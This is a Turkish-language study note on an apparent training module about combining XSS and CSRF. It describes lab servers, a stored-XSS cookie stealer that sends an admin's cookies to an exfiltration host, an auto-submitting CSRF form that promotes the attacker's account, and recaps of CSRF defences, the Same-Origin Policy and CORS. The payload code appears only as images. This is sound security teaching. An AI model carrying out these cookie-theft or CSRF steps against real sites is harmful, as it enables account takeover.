---
{"dg-publish":true,"permalink":"/web-pentest-expert/advanced-xss-and-csrf-exploitation/"}
---


Bu modülde tartışacağımız gibi, modern web tarayıcılarındaki birçok güvenlik politikası ve güvenlik önlemi, CSRF güvenlik açıklarının temel istismarını kısıtlar veya önler. Örneğin, ilerleyen bölümlerde daha ayrıntılı olarak inceleyeceğimiz Same-Origin politikası, Cross-Origin Kaynak Paylaşımı (CORS) ve SameSite cookies gibi.

Bu nedenle, düz CSRF güvenlik açıklarının istismarı gerçek dünyada giderek daha nadir hale gelmiştir. Bununla birlikte, bir XSS açığı keşfedersek, XSS ve CSRF'nin istismarını birleştirebiliriz, bu da savunmasız web uygulamasının kendisine ve potansiyel olarak kurbanın iç ağındaki ek web uygulamalarına saldırmamızı sağlayan güçlü bir araçla sonuçlanır

CSRF ve XSS açıklarından faydalanmak ve savunmasız web uygulamasıyla etkileşime geçmek için [XMLHttpRequest](https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest) nesnesini veya daha modern [Fetch API](https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API)'sini kullanabiliriz. Yöntem, HTTP başlıkları veya request body gibi HTTP parametrelerini belirtirken JavaScript kodundan HTTP istekleri yapmak için her ikisini de kullanabiliriz.

Örneğin, xhr.open çağrısında URL'yi belirterek, xhr.setRequestHeader fonksiyonunu kullanarak HTTP başlıklarını ayarlayarak ve xhr.send çağrısında request body parametrelerini belirterek XMLHttpRequest nesnesini kullanarak bir POST isteği gönderebiliriz:

![Pasted image 20241216163724.png](/img/user/resimler/Pasted%20image%2020241216163724.png)
![Pasted image 20241216163728.png](/img/user/resimler/Pasted%20image%2020241216163728.png)

Öte yandan, aynı isteği Fetch API kullanarak şu şekilde gönderebiliriz:

![Pasted image 20241216163743.png](/img/user/resimler/Pasted%20image%2020241216163743.png)

fetch fonksiyonu ilk parametrede URL'yi bekler. Tüm ek request parametrelerini ikinci parametrede bir nesne içinde aktarabiliriz.

Not: Whitebox sızma testi sürecinde olduğu gibi, XSS ve CSRF istismarlarımızı kurbanlara göndermeden önce lokal olarak debug etmek ve test etmek çok önemlidir; bu, angajmanlar sırasında hizmet reddi gibi istenmeyen davranışlara yol açabilecek hatalardan kaçınmamızı sağlar.


### Laboratuvar Ortamına Giriş

Bu modülde, tüm laboratuvarlar aynı genel yapıyı takip edecek ve istismarımızı geliştirmek, ince ayar yapmak ve sunmak için kullanabileceğimiz birden fazla virtual hosts içerecektir. Bu bölümde, elimizdeki farklı araçları ve bunları ilerleyen bölümlerde karşılaşacağımız farklı CSRF ve XSS güvenlik açıklarından yararlanmak için nasıl kullanabileceğimizi tartışacağız.

Genel olarak, laboratuvarlar aşağıdaki bileşenlerden oluşur:

* exfiltrate.htb adresinde bir sızma sunucusu
* exploitserver.htb adresinde bir exploit geliştirme sunucusu
* vulnerablesite.htb adresinde değerlendirdiğimiz güvenlik açığı olan web uygulaması


### Exfiltration Server (Sızma Sunucusu)

Exfiltrate.htb adresindeki exfiltration sunucusu veri sızdırmak için kullanılabilir. Bu nedenle, exfiltration sunucusu GET parametreleri, POST parametreleri ve HTTP header'ları dahil olmak üzere kendisine yapılan tüm isteklerin tüm istek parametrelerini loglar. Loglanan verilere /log endpoint adresinden erişilebilir.

Örneğin, param1 ve param2 parametreleri aracılığıyla veri sızdırdığımızı varsayarak aşağıdaki HTTP isteğini yapabiliriz:

![Pasted image 20241216164132.png](/img/user/resimler/Pasted%20image%2020241216164132.png)

Daha sonra, sızan verileri görüntülemek için logu alabiliriz:

![Pasted image 20241216164154.png](/img/user/resimler/Pasted%20image%2020241216164154.png)

Log'a bir web tarayıcısından da erişebiliriz:

![Pasted image 20241216164217.png](/img/user/resimler/Pasted%20image%2020241216164217.png)


### Exploit Development Server

exploitserver.htb adresindeki exploit geliştirme sunucusunu kullanarak bir CSRF veya XSS payload'u geliştirebilir ve bu exploit'i kurbanımıza gönderebiliriz.

Exploit geliştirme sunucusu, hedef web uygulamalarında bulduğumuz belirli güvenlik açıklarını hedeflemek için özel bir exploit geliştirmemizi sağlar. Hedef web uygulamasında bir XSS kavram kanıtı için bir uyarı kutusunu tetiklemek istediğimizi varsayalım:

![Pasted image 20241216164417.png](/img/user/resimler/Pasted%20image%2020241216164417.png)

Geliştirdiğimiz exploit'i /exploit endpoint'ine erişerek görüntüleyebiliriz. Bunu yapmak uyarı açılır penceresini tetikler:

![Pasted image 20241216164435.png](/img/user/resimler/Pasted%20image%2020241216164435.png)

Son olarak, /deliver endpoint'e erişerek kurbanımıza exploit'i teslim edebiliriz, bu da kurbanın http://exploitserver.htb/exploit adresini ziyaret ederek geliştirdiğimiz payload'u tetiklemesine neden olacaktır. Bu, exploit kodunu tetiklemek için kurbanın gönüllü olarak payload'a erişmesi gereken CSRF saldırılarında faydalıdır. Bu modül, exploit teslim yöntemlerine değil, exploit geliştirmeye odaklanmaktadır. Payload'u kurbana teslim etmek exploit'i tetiklemeye zorlar; gerçek dünyada, kurbana e-posta veya herhangi bir mesajlaşma servisi aracılığıyla bir bağlantı göndermek de dahil olmak üzere çok sayıda exploit teslim yöntemi mevcuttur.

Bir XSS payload'u geliştirmek için exploit sunucusunu da kullanabiliriz. Ancak, bu gibi durumlarda exploit'i kurbana iletmemize gerek yoktur, çünkü payload savunmasız siteye enjekte edilen XSS payload'u tarafından iletilecektir.


### Lab Warmup

Laboratuvar bileşenlerini tartıştıktan sonra, birkaç örnek güvenlik açığını istismar etmek için bunları nasıl kullanabileceğimizi keşfedelim.


### XSS Warm-Up

Örnek web uygulamamız, tüm kullanıcıların görebileceği girişler bırakmamıza olanak tanıyan basit bir ziyaretçi defteridir. Bir yönetici, spam içerikleri engellemek için girişleri düzenli olarak kontrol eder.

![Pasted image 20241216164725.png](/img/user/resimler/Pasted%20image%2020241216164725.png)

Aşağıdaki girdiyi yayınlayarak bariz bir XSS güvenlik açığını doğrulayabiliriz:

![Pasted image 20241216165642.png](/img/user/resimler/Pasted%20image%2020241216165642.png)

![Pasted image 20241216165647.png](/img/user/resimler/Pasted%20image%2020241216165647.png)

Yönetici kullanıcının cookie'lerini çalmak için bir exploit geliştirelim. Exploit sunucusundan script yükleyen bir payload kullanarak exploitserver'ı exploit geliştirme için kullanabiliriz:

![Pasted image 20241216165729.png](/img/user/resimler/Pasted%20image%2020241216165729.png)

Daha sonra, exploit sunucusunda aşağıdaki gibi bir cookie stealer payload oluşturabiliriz. Cookie'yi exfiltrate etmek için exfiltration sunucusunu kullanabiliriz:

![Pasted image 20241216165759.png](/img/user/resimler/Pasted%20image%2020241216165759.png)

Exploit'i kaydettikten sonra, /exploit endpoint'ine erişerek kaydedildiğini onaylayabiliriz:

![Pasted image 20241216165832.png](/img/user/resimler/Pasted%20image%2020241216165832.png)

Son olarak, yönetici kullanıcının ziyaretçi defterine erişmesini beklemeliyiz. Enjekte edilen XSS payload'u yöneticinin tarayıcısının payload'u exploit sunucusundan yüklemesine neden olur, bu da yönetici kullanıcının cookie'lerini exfiltration sunucusuna sızdırır. Sızma sunucusunun loguna /log endpoint adresinden erişildiğinde sızan cookie'ler ortaya çıkar:

![Pasted image 20241216165924.png](/img/user/resimler/Pasted%20image%2020241216165924.png)


### CSRF Warm-Up

Örnek web uygulaması henüz yapım aşamasında olduğu için fazla fonksiyon içermemektedir:

![Pasted image 20241216192241.png](/img/user/resimler/Pasted%20image%2020241216192241.png)

Ancak, yalnızca kullanıcı yetkilerimiz olduğunu görebiliyoruz. Bir "yükselt" butonu var. Buna bastığımızda, web uygulaması bize yalnızca yönetici kullanıcıların diğer kullanıcıları yükseltebileceğini bildiriyor. Ancak, yükseltme işleminin aşağıdaki istekle gerçekleştirildiğini görebiliyoruz:

![Pasted image 20241216192353.png](/img/user/resimler/Pasted%20image%2020241216192353.png)

Özellikle, bu end point'te CSRF koruması bulunmamaktadır, bu da bir yöneticiye kullanıcı hesabımızı yükseltmek için bir CSRF saldırısı gerçekleştirmemize olanak tanır. Bunu yapmak için, yükseltme isteğine karşılık gelen bir HTML formu oluşturmamız gerekir:

![Pasted image 20241216192542.png](/img/user/resimler/Pasted%20image%2020241216192542.png)

Saldırının ek bir kullanıcı etkileşimi gerektirmesini istemediğimiz için, sayfa yüklendiğinde formu otomatik olarak gönderen JavaScript kodu ekleyeceğiz:

![Pasted image 20241216192629.png](/img/user/resimler/Pasted%20image%2020241216192629.png)
![Pasted image 20241216192634.png](/img/user/resimler/Pasted%20image%2020241216192634.png)


Bu iki parçayı birleştirdiğimizde, exploitserver.htb adresindeki exploitserver'a kaydedeceğimiz aşağıdaki payload ortaya çıkar:

![Pasted image 20241216192701.png](/img/user/resimler/Pasted%20image%2020241216192701.png)

Güvenlik açığı olan uygulamada oturum açmışken View Exploit'e tıklayarak exploit'imizi test edebiliriz. Bu, kaydedilmiş payload'umuzu döndüren http://exploitserver.htb/exploit adresine bir istekle sonuçlanır. Payload, formu otomatik olarak göndererek güvenlik açığı bulunan web uygulamasına çcross-origin request oluşturur. Ancak, yönetici olmadığımız için yükseltme başarısız olur:

![Pasted image 20241216192802.png](/img/user/resimler/Pasted%20image%2020241216192802.png)

Ancak bu, CSRF payload'umuzun kullanıcımızı yükseltmek için HTTP isteğini başarıyla gönderdiğini doğrular. Saldırıyı gerçekleştirmek için, payload'umuzu kurbana gönderebiliriz. Bu, kurbanın http://exploitserver.htb/exploit adresine erişmesiyle sonuçlanacaktır. Birkaç saniye bekledikten ve sayfayı yeniledikten sonra yönetici konumuna terfi ederiz:

![Pasted image 20241216192837.png](/img/user/resimler/Pasted%20image%2020241216192837.png)

Böylece, CSRF güvenlik açığından başarılı bir şekilde yararlanarak yöneticinin kullanıcımızı yükseltmesini sağladık.

Not: Laboratuvarlar üzerinde çalışırken lütfen aşağıdaki hususları aklınızda bulundurun:

* Bu modüldeki tüm laboratuvarlarda simüle edilmiş bir kurban kullanıcı bulunmaktadır. Bu kurban kullanıcının payload'a erişmesi biraz zaman alabilir. Bu nedenle, payload'unuzun çalıştığından emin olmak için öncelikle kendiniz test edin ve kurbanın exploiti tetiklemesi için birkaç dakika sabırlı bir şekilde bekleyin.

* Simüle edilen kurban, **Chromium 114.0.5735.90** sürümünü kullanmaktadır. Exploitler bu tarayıcı sürümünde test edilmiştir. Üçüncü taraf cookielerin işlenmesiyle ilgili son değişiklikler nedeniyle, exploitlerin daha yeni tarayıcı sürümlerinde çalışacağı garanti edilemez. Daha eski Chromium sürümlerini [buradan](https://mirror.cs.uchicago.edu/google-chrome/pool/main/g/google-chrome-stable/) indirebilirsiniz.

* Bir laboratuvardan diğerine geçerken lütfen tüm cookieleri silin. Önceki laboratuvarlardan kalan cookieler, tarayıcının gelecekteki laboratuvarlarda cookieleri reddetmesine neden olabilir.



### Introduction to CSRF Exploitation

CSRF güvenlik açıklarının istismarını ayrıntılı olarak tartışmadan önce, CSRF'nin temellerini ve yaygın CSRF savunmalarını hızlıca özetleyeceğiz. Daha ayrıntılı bir açıklama için Session Security modülüne göz atın



### Recap: Cross-Site Request Forgery (CSRF)

Cross-Site Request Forgery (CSRF), bir saldırganın payload'unun, kurbanın tarayıcısını, kimlik doğrulamasının yapıldığı savunmasız bir web uygulamasında istemeden eylemler gerçekleştirmeye zorladığı bir web saldırısı türüdür. CSRF saldırıları genellikle saldırgan tarafından kontrol edilen bir web sitesindeki bir payload tarafından gerçekleştirilir ve bu payload savunmasız web uygulamasına cross-origin istekleri gönderir. Bu nedenle, saldırı genellikle kurbanın saldırganın kontrolündeki web sitesine gönüllü olarak veya sosyal mühendislik gibi diğer saldırı vektörleri aracılığıyla erişmesini gerektirir. Başarılı bir CSRF saldırısında, cross origin isteği kurbanın session cookie'leri ile gönderilir ve savunmasız web uygulamasında bir değişiklik gerçekleştirir.

Örnek olarak, aşağıdaki senaryoyu ele alalım. Kurban, **[http://vulnerablesite.htb](http://vulnerablesite.htb)** sitesinin bir yöneticisidir ve siteye giriş yapmıştır, yani tarayıcıda geçerli bir oturum cookie'si bulunmaktadır. Site, CSRF saldırılarına karşı korumalı değildir. Saldırgan, savunmasız web uygulamasında düşük ayrıcalıklı bir hesaba sahiptir ve yönetici yetkilerini elde etmek için bir CSRF saldırısı gerçekleştirmek istemektedir. Kurban, saldırganın kontrol ettiği **[http://exploitserver.htb](http://exploitserver.htb)** sitesine eriştiğinde, bu site, kurbanın tarayıcısında JavaScript kodu çalıştırarak **[http://vulnerablesite.htb/promote?user=attacker](http://vulnerablesite.htb/promote?user=attacker)** adresine cross-origin (çapraz kaynak) bir istek gönderir.

Tarayıcı, kurbanın oturum cookie'lerini bu çapraz kaynak isteğiyle birlikte gönderir, böylece istek kimlik doğrulanır. Bu nedenle, web uygulaması saldırganın kullanıcı hesabını yönetici seviyesine yükseltir ve saldırgan, CSRF saldırısını başarılı bir şekilde gerçekleştirerek web uygulamasında yönetici yetkileri elde eder.

Bu modülde CSRF payload'larını manuel olarak oluşturacak olsak da, otomatik payload oluşturma için kullanabileceğimiz araçlar vardır, örneğin buradaki [CSRF PoC](https://csrf-poc-generator.vercel.app/) oluşturucu.


### Recap: CSRF Defenses

CSRF saldırılarına karşı koruma sağlamak için birçok farklı savunma mekanizması vardır ve bunların çoğu Same-Origin ilkesinin getirdiği kısıtlamalara dayanır. CSRF koruması için farklı seçenekleri kısaca özetleyeceğiz.


### CSRF Tokens
CSRF Token'ları, örneğin HTML formları gönderilirken web uygulamasında hassas değişiklikler yapan isteklere dahil edilmesi gereken benzersiz ve rastgele değerlerdir. Token tahmin edilemez olmalıdır, böylece bir saldırgan değerini önceden bilemez. Ayrıca, web uygulamasının hassas değişikliği gerçekleştirmeden önce CSRF token'ının değerini kontrol etmesi gerekir. Bu, saldırganın web uygulamasının kabul ettiği bir cross-site isteği oluşturmasını engeller. Token tahmin edilemez olmalı, backend tarafından yeterince kontrol edilmeli ve bir cookie içinde gönderilmemelidir, aksi takdirde CSRF token koruması etkisiz olabilir.

Yukarıdaki örneğimizde, web uygulaması yalnızca user GET parametresinde kullanıcı adını ve csrf_token GET parametresinde CSRF token'ını (genellikle HTML formunda gizli bir değer) içeren kullanıcı yükseltme isteklerini kabul edecektir. CSRF token rastgele bir değer olduğundan, saldırgan doğru değeri bilemez ve bu nedenle, yalnızca geçersiz bir CSRF token ile  cross-origin request oluşturabilir. Web uygulaması CSRF token'ını doğru bir şekilde kontrol ederse, istek reddedilir, böylece saldırgan kullanıcı hesabı yönetici ayrıcalıklarına yükseltilmemiş olur.


### HTTP Headers

CSRF token'larına alternatif olarak web uygulamaları CSRF saldırılarından korunmak için HTTP başlıklarını kullanabilir. Örneğin, bir web uygulaması [Origin](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Origin) veya [Referer](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referer) başlıklarını kontrol ederek Cross-origin isteklerini engelleyebilir ve böylece CSRF saldırılarını önleyebilir.

Web tarayıcıları, isteğin geldiği hedef kaynağı belirtmek için genellikle Origin başlığını cross origin isteklerine ekler. Bir saldırgan bu davranışı kontrol edemez. Bu nedenle bir web uygulaması, bir isteğin başka bir kaynaktan gelip gelmediğini belirlemek için Origin başlığının değerini kontrol edebilir ve ardından CSRF saldırılarını önlemek için durum değiştiren cross origin isteklerini engelleyebilir.

Aynı metodoloji, bir kaynağın hangi URL'den talep edildiğini belirtmek için genellikle web tarayıcıları tarafından eklenen Referer başlığına da uygulanabilir.


### SameSite Cookies

Bir başka CSRF koruma mekanizması da SameSite cookie özniteliğidir (ilk olarak bu İnternet Taslağında hazırlanmış ve daha sonra başka bir[ İnternet Taslağında ](https://datatracker.ietf.org/doc/html/draft-west-cookie-incrementalism-01)güncellenmiştir). Bir web uygulaması, cookie'nin cross-origin istekleriyle birlikte gönderilip gönderilmeyeceğini yapılandırmak için bu özniteliği ayarlayabilir. Öznitelik aşağıdaki değerlere sahip olabilir:

* none : tarayıcı tarafından hiçbir ek önlem uygulanmaz. Cookie tüm cross-origin istekleri ile birlikte gönderilir

* lax : tarayıcı cookie'yi sadece bazı cross-origin istekleri ile gönderir. Örneğin, yalnızca GET kullanılarak yapılan crossorigin form gönderimleri. Cookie, JavaScript'ten yapılan herhangi bir cross-origin isteği ile gönderilmez

* strict : tarayıcı cookie'yi herhangi bir cross-origin isteği ile göndermez

Çoğu modern tarayıcı, varsayılan olarak (yani, SameSite cookie attribute'u açıkça ayarlanmamışsa) SameSite attribute'unu Lax olarak zorlar. Tarayıcı yalnızca güvenli HTTP istekleriyle cookie gönderdiğinden ve bu da POST tabanlı CSRF saldırılarını önlediğinden, bu varsayılan olarak birçok CSRF saldırısını önler. GET tabanlı CSRF saldırıları hala mümkündür ancak POST tabanlı CSRF saldırılarına göre önemli ölçüde daha az yaygındır

Genel olarak, web uygulamalarının birincil CSRF savunması olarak CSRF token'larını kullanmaları önerilir. SameSite cookies ve header tabanlı kontroller de ek derinlemesine savunma önlemleri olarak kullanılabilir.


### Same-Origin Policy & CORS

CSRF saldırılarına karşı savunmaları ve bunların nasıl atlatılacağını tam olarak anlamak için öncelikle [Same-Origin Policy](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy) ve [Cross-Origin Resource Sharing (CORS) ](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS)konularını tartışmamız gerekir.



### What is the Same-Origin Policy?

Same-Origin politikası, web sitelerine cross origin erişimi önlemek için web tarayıcılarında uygulanan bir güvenlik mekanizmasıdır. Özellikle, bir kaynakta çalışan JavaScript kodu farklı bir kaynağa erişemez. Bu, kötü niyetli bir sitenin diğer originden bilgi sızdırmasını önler ve diğer originlere yapabileceği istek türlerini kısıtlar.

Orijin (kavram hakkında daha fazla bilgi için RFC 6454'e bakın) bir URL'nin scheme, host ve port'u olarak tanımlanır. Same-Origin politikası, iki URL bu üç özellikten en az birinde farklılık gösterdiğinde uygulanır. Örneğin, bir http sitesi ve bir https sitesi, şemadaki farklılık nedeniyle farklı orijinlere sahiptir. Ayrıca, https://academy.hackthebox.com ve https://hackthebox.com da host farklılığı nedeniyle farklı kökenlere sahiptir. Öte yandan, https://hackthebox.com ve https://hackthebox.com:443 şema, host ve port eşleştiği için aynı orijini paylaşmaktadır (https'nin varsayılan portu 443'tür).

Web tarayıcılarının Same-Origin politikasını uyguladığı göz önüne alındığında, yazılımlarındaki güvenlik açıkları ve hatalar bypasslara yol açarak potansiyel olarak yüksek önemde güvenlik açıklarına neden olabilir

[[Bağlantılar/Chatgpt origin acıklama\|Chatgpt origin acıklama]]


### "Same-Origin Policy olmadan

Same-Origin politikasının web güvenliği için neden çok önemli olduğunu anlamak için, bunun olmadığı bir senaryo hayal edelim.

Ev ağımızdaki özel dizüstü bilgisayarımızda https://exploitationserver.htb kötü amaçlı web sitesini ziyaret ettikten sonra aşağıdaki JavaScript kodunu çalıştırdığını varsayalım:

![Pasted image 20241216201535.png](/img/user/resimler/Pasted%20image%2020241216201535.png)
![Pasted image 20241216201540.png](/img/user/resimler/Pasted%20image%2020241216201540.png)

https://exploitationserver.htb adresindeki JavaScript kodu, tarayıcımızdan https://mymails.htb/getmails , https://mybank.htb/myaccounts ve https://192.168.178.5/ adreslerine üç adet getch isteği yapar. Bu sitelerden herhangi birinde oturum açtıysak, SameSite cookie yapılandırmasına bağlı olarak tarayıcımız bu isteklerle birlikte oturum cookie'lerimizi de gönderecektir. Bu, bu isteklerin kimliğinin doğrulanmasını sağlar. JavaScript kodu daha sonra yanıtı https://exfiltrate.htb/exfiltrate adresine geri göndererek dışarı sızdırır. Bu şekilde, https://exfiltrate.htb adresini çalıştıran saldırgan, kullanıcı hesabımızdan gelen üç doğrulanmış GET isteğinin yanıtını elde eder ve saldırganın https://mymails.htb adresindeki e-postalarımıza, https://mybank.htb adresindeki banka bilgilerimize ve hesap bakiyemize ve hatta https://192.168.178.5 adresindeki ev iç ağımızda çalışan wiki'mize (herkese açık olmayan ancak yalnızca local ağdan erişilebilen) erişmesini sağlar.

Bu önemli bir güvenlik ihlalidir ve bunun olmasını önlemek için hiçbir şey yapamayız. Same-Origin politikası özellikle bu sorunu hafifletmek için tasarlanmıştır.



### Same-Origin Policy ile

Yukarıda tartışıldığı gibi, Same-Origin politikası orijinler arasında erişimi engeller. Yukarıdaki durumda, https://exploitationserver.htb'un orijini, farklı host nedeniyle kötü niyetli web sitesi tarafından saldırılan üç orijinden de farklıdır. Bu nedenle, farklı bir orijine getirme çağrısı, tarayıcıda Same-Origin politikasının neden olduğu bir hataya neden olur ve https://exploitationserver.htb verilere erişemez ve verileri sızdıramaz:

![Pasted image 20241216202058.png](/img/user/resimler/Pasted%20image%2020241216202058.png)

Same-Origin politikasının https://exploitationserver.htb'un yalnızca cross-origin request'in yanıtına erişmesini engellediğini anlamak çok önemlidir. (Potansiyel olarak kimliği doğrulanmış) talebin kendisi hala gönderilmektedir. Bunu Burp ile doğrulayabiliriz. Bunun gerçekten de cross-origin bir istek olduğunu gösteren Origin ve Referer başlıklarına dikkat edin:

![Pasted image 20241216202346.png](/img/user/resimler/Pasted%20image%2020241216202346.png)

Bu davranış, istek geri çekilmediği için CSRF saldırılarına yol açabilir.

Same-Origin politikasının bazı istisnaları vardır. Örneğin, img, video ve script etiketleri gibi kaynakları cross-origins olarak ekleyebiliriz. Örneğin, Cross Orijin yüklenmiş olsa da, Hack The Box Academy'nin logosunu aşağıdaki HTML kodunu kullanarak sahip olduğumuz bir web sitesine dahil edebiliriz:

![Pasted image 20241216202650.png](/img/user/resimler/Pasted%20image%2020241216202650.png)



### What is CORS?

Cross-Origin Resource Sharing (CORS), Same-Origin politikasındaki istisnaları tanımlamak için bir W3C standardıdır. Bu, bir kaynağın güvenilir kaynakların ve kaynaklar arasında izin verilecek HTTP yöntemlerinin bir listesini tanımlamasına olanak tanır.


### Why do we need CORS?

CORS'a neden ihtiyaç duyduğumuzu anlamak için, gerçek dünyada yaygın olan aşağıdaki senaryoyu varsayalım: http://vulnerablesite.htb adresinde barındırılan bir web uygulaması verileri görüntüler. Bunu yapmak için, http://api.vulnerablesite.htb adresinde barındırılan bir API ile konuşur. Daha spesifik olarak, http://vulnerablesite.htb üzerinde çalışan uygulama yalnızca API'den veri alan front-end kodundan oluşmaktadır. API, veri oluşturmak, okumak, güncellemek ve silmek için endpoint'lerden oluşan basit bir REST API uygular.

Bu, verilerle ilgili herhangi bir mantığı işlemesi gerekmeyen basit bir front-end web uygulamasına izin verir. Özellikle, front-end kodu API ile etkileşimi yönetir, bunun için aşağıdakine benzer JavaScript kodu kullanabilir, böylece site yüklendikten sonra tüm veriler getirilir:

![Pasted image 20241216204727.png](/img/user/resimler/Pasted%20image%2020241216204727.png)
![Pasted image 20241216204732.png](/img/user/resimler/Pasted%20image%2020241216204732.png)

Ancak, yukarıda tartışıldığı gibi, http://vulnerablesite.htb ve http://api.vulnerablesite.htb farklı orijinler olduğundan, bu durum Same-Origin politikasını ihlal etmektedir. Bu nedenle, yukarıdaki JavaScript kodu bir hataya neden olur ve veriler düzgün yüklenmez:

![Pasted image 20241216204811.png](/img/user/resimler/Pasted%20image%2020241216204811.png)

Şimdi CORS'un nasıl çalıştığını ve bir web uygulamasının bir API ile Same-Origin politikasının neden olduğu hatalar olmadan konuşmak için neler yapabileceğini tartışalım


### CORS nasıl çalışır?

Bir web sunucusu, HTTP yanıtında aşağıdaki CORS headerlarından herhangi birini ayarlayarak Same-Origin politikasına istisnalar tanımlayabilir (preflight istekleri konusunu daha sonra ele alacağız):

- **Access-Control-Allow-Origin:** Belirli bir origin için Same-Origin politikasına istisnalar tanımlar.
- **Access-Control-Expose-Headers:** Belirli HTTP headerları için Same-Origin politikasına istisnalar tanımlar.
- **Access-Control-Allow-Methods:** Preflight isteğine yanıt olarak izin verilen HTTP yöntemleri için Same-Origin politikasına istisnalar tanımlar.
- **Access-Control-Allow-Headers:** Preflight isteğine yanıt olarak izin verilen HTTP headerları için Same-Origin politikasına istisnalar tanımlar.
- **Access-Control-Allow-Credentials:** `true` olarak ayarlandığında, cookies veya Authorization header gibi kimlik doğrulama bilgileri içeren cross-origin isteklere rağmen Same-Origin politikasına istisnalar tanımlar.
- **Access-Control-Max-Age:** Diğer CORS headerlarında yer alan bilgilerin, yeni bir preflight isteği gönderilmeden ne kadar süreyle önbellekte tutulabileceğini tanımlar.


En basit CORS yapılandırması, herhangi bir komut dosyası kodu olmadan düz HTML'den yapılabilen basit istek olarak adlandırılan yapılandırmadır. Basit istekler, herhangi bir özel HTTP header'ı olmadan GET veya HEAD istekleri olabileceği gibi, herhangi bir özel HTTP header'ı ve application/x-wwwform-urlencoded , multipart/form-data veya text/plain Content-Type'ı olmayan POST istekleri de olabilir.

Örneğimizde, veri alma işlemi **[http://api.vulnerablesite.htb/data](http://api.vulnerablesite.htb/data)** adresine yapılan bir GET isteği ile gerçekleştirilmiştir. Bu, yukarıdaki koşulları karşıladığı için basit bir istektir. Bu nedenle, API'nin yalnızca istek yapan origin için bir istisna tanımlaması ve tüm API yanıtlarında **Access-Control-Allow-Origin** headerını ayarlaması gerekir.

Daha sonra, http://vulnerablesite.htb adresindeki web uygulaması cross-origin isteğinden gelen yanıtı okuyabilir. İşte Cross-origin isteği ve Burp'teki yanıt:

![Pasted image 20241216212731.png](/img/user/resimler/Pasted%20image%2020241216212731.png)


### Preflight Requests

Basit istekler koşullarına uymayan tüm istekler, **preflighted requests** olarak adlandırılır. Tarayıcı, bu tür cross-origin istekleri göndermeden önce, farklı bir origine **preflight request** gönderir ve bu istek, gerçek cross-origin isteğinin tüm parametrelerini içerir. Bu, web sunucusunun cross-origin isteğe izin verip vermeyeceğine karar vermesini sağlar.

Tarayıcı, preflight isteğine gelen yanıtı bekler ve yalnızca web sunucusu, preflight isteğine yanıt olarak uygun **CORS headers** ayarlayarak izin verirse gerçek cross-origin isteği göndermeye devam eder. Tarayıcı, gerçek cross-origin isteğini göndermeden önce web sunucusundan izin istediği için, **preflighted requests** ile CSRF açıkları mümkün değildir.

preflight request aşağıdaki header'ları içeren bir OPTIONS isteğidir:

* Access-Control-Request-Method: sunucuyu gerçek istekte kullanılan HTTP yöntemi hakkında bilgilendirir
* Access-Control-Request-Headers: sunucuya gerçek istekte kullanılan HTTP başlıkları hakkında bilgi verir

Örneğin, API'nin web uygulamasından gelen bir POST isteğinde JSON verilerini kabul etmesi gerekiyorsa, Content-Type basit bir istekte izin verilmeyen application/json olarak ayarlandığı için basit bir istek yetersizdir. Bu nedenle, tarayıcı asıl isteği göndermeden önce bir preflight request gönderecektir. API'nin CORS response header'larını buna göre ayarlaması ve tarayıcıya cross-origin isteğine izin verdiğini söylemesi gerekir. Daha spesifik olarak, http://vulnerablesite.htb kaynağına, POST metoduna ve Content-Type başlığına izin vermelidir.

CORS başlıkları doğru yapılandırıldığında, web uygulaması ve API, Same-Origin politikası sorunları olmadan birbirleriyle konuşabilir. Bir kullanıcının POST isteğiyle yeni bir data item oluşturmak istediğini varsayalım; kullanıcının tarayıcısı ilk olarak API'nin potansiyel olarak tehlikeli olan cross-origin isteğine izin verip vermediğini kontrol etmek için bir preflight isteği gönderecektir:

![Pasted image 20241216215403.png](/img/user/resimler/Pasted%20image%2020241216215403.png)

Response doğru CORS header'larını içerdiğinden, tarayıcı API'nin preflighted request'e izin verdiğini bilir; bu nedenle, request'i göndermeye devam eder:

![Pasted image 20241216215532.png](/img/user/resimler/Pasted%20image%2020241216215532.png)

Bu request aynı zamanda request kaynağıyla birlikte bir CORS header içerdiğinden, tarayıcı Same-Origin politikası için bir istisna ekler, böylece web uygulaması yanıta erişebilir ve işlemin sonucunu kontrol edebilir (bu durumda, Success).

Verileri güncellemek için bir PUT request'i ve verileri silmek için bir DELETE request'i etkinleştirmek için API, preflight request'in yanıtındaki Access-Control-Allow-Methods CORS header'ını izin verilen tüm yöntemleri içerecek şekilde ayarlamalıdır.


### CORS Misconfigurations

Same-Origin politikasını ve CORS'u ayrıntılı olarak ele aldığımıza göre, web uygulamalarında güvenlik açıklarına yol açabilecek yaygın CORS yanlış yapılandırmalarını ve bunların nasıl tespit edileceğini inceleyeceğiz.

CORS yanlış yapılandırmalarına geçmeden önce, CORS yanlış yapılandırmalarının ne tür saldırı vektörlerine yol açabileceğini tartışalım. Çoğu saldırı, Access-ControlAllow-Credentials başlığının true olarak ayarlanmasını gerektirir, böylece kurbanın context'inde kimliği doğrulanmış isteklerle sonuçlanır. Bir CORS yanlış yapılandırması, saldırgan tarafından kontrol edilen bir domain'e Same-Origin politikasının bir istisnasının verilmesiyle sonuçlanırsa, ortaya çıkan güvenlik açığı CSRF güvenlik açıklarına benzer, ancak daha ciddidir. Same-Origin politikasının istisnası, saldırganın kontrolündeki domain'in cross origin isteğinin yanıtına erişmesine izin verir. İstek kimliği doğrulanmış bir bağlamdan yapıldığından, yanıt saldırganın erişebileceği ve dışarı sızabileceği potansiyel olarak hassas bilgiler içerir. Ayrıca, belirli CORS yapılandırmasına bağlı olarak, saldırgan potansiyel olarak kurbanın kimliğine bürünmek ve onun adına eylemler yürütmek için web uygulamasıyla etkileşime girebilir.

Access-Control-Allow-Credentials header ayarlanmazsa, saldırganlar artık bu saldırıları gerçekleştiremez. Ancak, iç web uygulamasındaki bir CORS yanlış yapılandırması, bir saldırganın herkese açık olmayan bilgileri dışarı sızdırmasını sağlayabilir.

Not: Aşağıdaki CORS yanlış yapılandırmalarından bazılarının başarılı bir şekilde kullanılması, gerçek dünyadaki bir web uygulamasında session cookie üzerinde SameSite=None cookie özniteliğini gerektirebilir.


### Arbitrary Origin Reflection

